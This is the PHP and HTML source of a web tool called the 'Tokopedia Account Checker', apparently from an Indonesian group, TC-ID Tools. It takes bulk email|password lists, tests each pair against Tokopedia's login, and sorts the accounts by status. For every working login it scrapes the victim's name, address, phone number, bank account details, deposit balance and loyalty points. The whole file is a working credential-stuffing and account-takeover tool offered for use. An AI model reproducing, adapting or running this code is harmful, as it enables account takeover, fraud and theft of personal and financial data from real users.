﻿<!DOCTYPE html PUBLIC -//W3C//DTD XHTML 1.0 Strict//EN http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd>
<head title="TC-ID Tools"><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>TC-ID Tools | Tokopedia</title>
<meta name="google-site-verification" content="lg1_yHbfcHo_r7ofAGXXxdGEjmPHAEy_ZDL_mP9vr9c"/>
<link rel="shortcut icon" href="/img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1">
<meta property="og:image" content="/img/icon.png"/><meta http-equiv="expires" content="0">
<meta http-equiv="Content-Language" content="en-us">
<meta name="copyright" content="Copyright � TC-ID Tools">
<meta name="author" content="Syechrul Imam">

<meta name="distribution" content="Global">
<meta name="rating" content="General">
    <link href="css/bootstrap.css" rel="stylesheet">          
    <link href="css/bootstrap.min.css" rel="stylesheet">
           <link href="css/bootstrap-theme.css" rel="stylesheet">
  <link href="css/bootstrap-theme.min.css" rel="stylesheet">
</head>
  <body>
  <script type='text/javascript'>
var uid = '37480';
var wid = '69387';
</script>
<script type='text/javascript' src='http://cdn.popcash.net/pop.js'></script>
<!-- Static navbar -->
<nav class="navbar navbar-default">
<div class="container-fluid">
<div class="navbar-header">
<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
<span class="sr-only"> Toggle navigation </span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button>
<a class="navbar-brand" href="/"> TC-ID Tools</a>
</div>
<div id="navbar" class="navbar-collapse collapse">
<ul class="nav navbar-nav navbar-right">
<li class="active">
<a href="/">Home</a></li>
</ul>
</div><!--/.nav-collapse -->
</div><!--/.container-fluid -->
<div class="container"><div class="well">
<div class="panel panel-primary panelMove toggle panelRefresh panelClose">
                                    <!-- Start .panel -->
                                    <div class="panel-heading">
                                        <h4 class="panel-title">Tokopedia Account Checker <span class="label label-primary">NEW</span></h4>
                                    </div>
                                    <div class="panel-body">
</style>
<form action="" method="POST">
<textarea style="background:rgba(0,225,0,00);" name="mailpass" id="mailpass" style="width: 441px; height: 187px;" class="form-control" rows="7" placeholder="your@email.com|passW0rd"><?php
if (isset($_POST['mailpass'])) {
    echo $_POST['mailpass'];
}
?></textarea><br />
<input type="text" style="width: 37px; height: 25px;" rows="7" name="delim" value="|">
<input type="submit" class="btn btn-success" value="Submit" name="submit"><br><br>
<?php
if(isset($_POST['submit'])){
$delim = $_POST['delim'];
function search($line, $delim)
{
    $line = str_replace(" ", "", $line);
    $line = explode($delim, $line);
    $i    = 0;
    while ($i < count($line)) {
        if (strpos($line[$i], '@') && strpos($line[$i], '.')) {
            $mail = $line[$i];
            $pass = $line[$i + 1];
            $i    = 10000;
            if ($pass == "") {
                $pass = $line[$i - 1];
            }
        }
        $i++;
    }
    $line = $mail . "|" . $pass;
    $line = explode('|', $line);
    return $line;
}
$data = $_POST['mailpass'];
$extract = explode("\r\n", $data);
$i = 0;
    foreach ($extract AS $k => $line) {
        $i++;
        if (strpos($line, '=>') !== false) {
            $line = str_replace('=>', '|', $line);
        }
        if (strpos($line, ']') !== false) {
            $line = str_replace('=>', '|', $line);
        }
        if (strpos($line, '[') !== false) {
            $line = str_replace('=>', '|', $line);
        }
 
        $info = search(trim($line), $delim);
        $email = trim($info[0]);
        $pass   = $info[1];

$dir                   = dirname(__FILE__);
$config = $dir . '/_cook/' .rand(1,999999999999999). '.txt';
if (!file_exists($config)) {
    $fp = @fopen($config, 'w');
    @fclose($fp);
}
 
$cookie = 'cookie.txt';
$ch = curl_init('https://www.tokopedia.com/login.pl');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch,CURLOPT_POST,1);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,TRUE);
        curl_setopt($ch,CURLOPT_POST,TRUE);
        curl_setopt($ch,CURLOPT_FOLLOWLOCATION,TRUE);
        curl_setopt($ch,CURLOPT_COOKIEFILE, "$config");
        curl_setopt($ch,CURLOPT_COOKIEJAR,  "$config");
curl_setopt($ch,CURLOPT_POSTFIELDS,"email=$email&pwd=$pass");
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
$result = curl_exec($ch);
$now = "[TOKOPEDIA] [TCHecker]";
if(empty($result)){
echo "<font color=gray><b>Salah</b></font> => [TC-ID Tools] | ".$email." | ".$pass." | ".$now."<br/>";
}elseif(preg_match('/salah/i',$result)){
echo "<font color=red><b>Die</b></font> => [TC-ID Tools] | ".$email." | ".$pass." | [Akun Anda Telah D Blokir] | ".$now."<br/>";
}elseif(preg_match('/Keamanan/i',$result)){
echo "<font color=skyblue><b>Kode Keamanan</b></font> => [TC-ID Tools] | ".$email." | ".$pass." | [Security Check] | ".$now."<br/>";
}elseif(preg_match('/Aktivasi/i',$result)){
echo "<font color=yellow><b>[Aktivasi]</b></font> => [TC-ID Tools] | ".$email." | ".$pass." | [Aktivasi] | ".$now."<br/>";
}elseif(preg_match('/Akun Anda telah diblokir/i',$result)){
echo "<font color=red><b>Akun Mati</b></font> => [TC-ID Tools] | ".$email." | ".$pass." | [Akun Anda telah diblokir.] | ".$now."<br/>";
}elseif(preg_match('/Kata Sandi harus diisi/i',$result)){
echo "<font color=gray><b>Format Salah</b></font> => [TC-ID Tools] | ".$email." | ".$pass." | ".$now."<br/>";
}elseif(preg_match('/Kode OTP/i',$result)){
echo "<font color=blue><b>Kena OTP</b></font> => [TC-ID Tools] | ".$email." | ".$pass." | [OTP Verification] | ".$now."<br/>";
}Else{
            $ch = curl_init('https://www.tokopedia.com/interrupt.pl?type=invalid_full_name');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch,CURLOPT_POST,1);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,TRUE);
        curl_setopt($ch,CURLOPT_POST,TRUE);
        curl_setopt($ch,CURLOPT_FOLLOWLOCATION,TRUE);
        curl_setopt($ch,CURLOPT_COOKIEFILE, "$config");
        curl_setopt($ch,CURLOPT_COOKIEJAR,  "$config");
curl_setopt($ch,CURLOPT_POSTFIELDS,"full_name=asi+aois");
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
$gantinama = curl_exec($ch);
$nam = explode('"userFullName":"', $gantinama);
$nama = explode('","', $nam[1]);
$us = explode('"userId":', $gantinama);
$usid = explode(',"', $us[1]);
			$ud = json_decode($gantinama);
			@$cid = $ud->Address;
			curl_setopt($ch, CURLOPT_URL, "https://www.tokopedia.com/people/$usid[0]");
			curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
			$address = curl_exec($ch) or die(curl_error($ch));
			$json = json_decode($address, true);
$cut = explode('<i class="icon-home"></i>', $address);
$getadr = explode('</li>', $cut[1]);
if($getadr[0] == null){
$getadr[0] = 'No address';
}
$num = explode('<li><i class="icon-phone"></i> &nbsp;', $address);

$sl = explode('"userSeller":', $gantinama);
$seller = explode(',', $sl[1]);
if($seller[0] == 0){
$seller[0] = 'Buyer';
}elseif($seller[0] == 1){
$seller[0] = 'Seller';
}else{
$seller[0] = 'Unknow';
}
$getb = json_decode($gantinama);
			@$gate = $getb->Bank;
			curl_setopt($ch, CURLOPT_URL, "https://www.tokopedia.com/people/$usid[0]/bank");
			curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
			$bank = curl_exec($ch) or die(curl_error($ch));
			$tot = json_decode($bank, true);
			$hitung =  count($tot);
$rek = explode('<div class="detail-list">', $bank);
$rekbank = explode('</div>', $rek[1]);

$potongreknm = explode('<small><b>Nama Pemilik Rekening:</b></small><br />', $rekbank[0]);
$namabank = explode('</li>', $potongreknm[1]);
$nor = explode('<b>Nomor Rekening:</b></small><br />', $rekbank[0]);
$reknom = explode('</li>', $nor[1]);
$nmb = explode('<small><b>Nama Bank:</b></small><br />', $rekbank[0]);
$namabk = explode('</li>', $nmb[1]);
if($namabank[0] == null){
$namabank[0] = '-';
}
if($reknom[0] == null){
$reknom[0] = '-';
}
if($namabk[0] == null){
$namabk[0] = '-';
}
//phone
$getp = json_decode($gantinama);
			@$gate = $getp->Phone;
			curl_setopt($ch, CURLOPT_URL, "https://www.tokopedia.com/people/$usid[0]/address");
			curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
			$edit = curl_exec($ch) or die(curl_error($ch));
			$totp = json_decode($bank, true);
			$hitungp =  count($totp);
			$hp = explode('<div class="yellow-box">', $edit);
$hphone = explode('</div>', $hp[1]);
$potonghp = explode('<li><small><b>Telepon:</b></small> <br />', $hphone[0]);
$nohp = explode('</li>', $potonghp[1]);
if($nohp[0] == null){
$nohp[0] = 'No Phone';
}
//saldo
$getsal = json_decode($gantinama);
			@$gate = $getsal->Phone;
			curl_setopt($ch, CURLOPT_URL, "https://www.tokopedia.com/deposit.pl");
			curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
			$saldo = curl_exec($ch) or die(curl_error($ch));
			$tots = json_decode($saldo, true);
			$hitungs =  count($tots);
			$boslent = json_decode($saldo, true);
			$sld = explode('<h4 class="pull-left mt-5">', $saldo);
$lent = explode('</h4>', $sld[1]);
$potongsal = explode("<span id='useable-deposit'>", $lent[0]);
$saldonya = explode('</span>', $potongsal[1]);
if($saldonya[0] == null){
$saldonya[0] = '-';
}
//point
$getpo = json_decode($gantinama);
			@$gate = $getpo->Point;
			curl_setopt($ch, CURLOPT_URL, "https://www.tokopedia.com/lp.pl");
			curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
			$point = curl_exec($ch) or die(curl_error($ch));
			$totp = json_decode($point, true);
			$hitungp =  count($totp);
			$mrlent = json_decode($point, true);
			$pnt = explode('<h4 class="mt-5 mb-0 lh-15">', $point);
$topoint = explode('</h4>', $pnt[1]);
$potongpo = explode('<span class="display-block" id="loyal-point">', $topoint[0]);
$pointnya = explode('</span>', $potongpo[1]);
if($pointnya[0] == null){
$pointnya[0] = '-';
}
echo "<font color=green><b>Live</font> => ".$email." | ".$pass." | $seller[0] | <b><font color=green>Saldo: $saldonya[0]</font></b> | <b><font color=orange>Point: $pointnya[0]</font></b> | <b><font color=blue>$namabank[0], $namabk[0], $reknom[0]</font></b> | $nama[0] | $getadr[0] | $nohp[0] ".$now."</b><br/>"; }

}
}
?>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
</body>
</div></div></div>
<div class="progress progress-striped active">
<div class="progress-bar" style="width: 100%"></div></div>
         <div id="footer" class="jumbotron" style="padding: 20px;text-align: center;margin-bottom: 0px;"><strong> Copyright &copy; 2016 TC-ID Team. All Right Reserved. </strong></font>